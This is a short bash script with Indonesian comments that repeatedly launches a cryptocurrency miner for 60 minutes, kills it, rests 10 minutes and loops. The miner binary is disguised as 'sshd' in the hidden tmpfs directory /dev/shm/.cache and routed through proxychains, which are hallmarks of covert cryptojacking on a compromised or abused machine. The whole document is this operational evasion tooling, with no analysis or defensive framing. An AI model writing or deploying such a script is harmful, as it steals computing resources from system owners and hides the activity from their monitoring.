#!/bin/bash

while true
do
    echo "⛏️ Mining dimulai... (60 menit)"
    proxychains4 -f ~/.proxychains/proxychains.conf /dev/shm/.cache/sshd &
    MINER_PID=$!
    
    sleep 3600  # Mining selama 60 menit

    echo "🛑 Istirahat 10 menit..."
    kill $MINER_PID  # Hentikan miner
    sleep 600  # Istirahat 10 menit
done
